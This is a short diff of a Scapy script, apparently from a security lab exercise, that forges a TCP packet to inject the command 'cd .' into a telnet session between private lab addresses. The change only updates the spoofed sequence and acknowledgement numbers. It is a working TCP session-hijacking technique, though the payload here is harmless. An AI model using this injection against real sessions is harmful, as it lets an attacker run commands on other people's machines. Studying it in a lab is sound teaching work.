@@ -2,7 +2,7 @@
 from scapy.all import *
 eth = Ether(src="02:42:0a:09:00:06", dst="02:42:0a:09:00:05")
 ip  = IP(src="10.9.0.6", dst="10.9.0.5")
-tcp = TCP(sport=59956, dport=23, flags="AP", seq=1724373313, ack=3460737540)
+tcp = TCP(sport=59956, dport=23, flags="AP", seq=516335993, ack=2142703168)
 data = "cd .\r"
 pkt = ip/tcp/data
 ls(pkt)
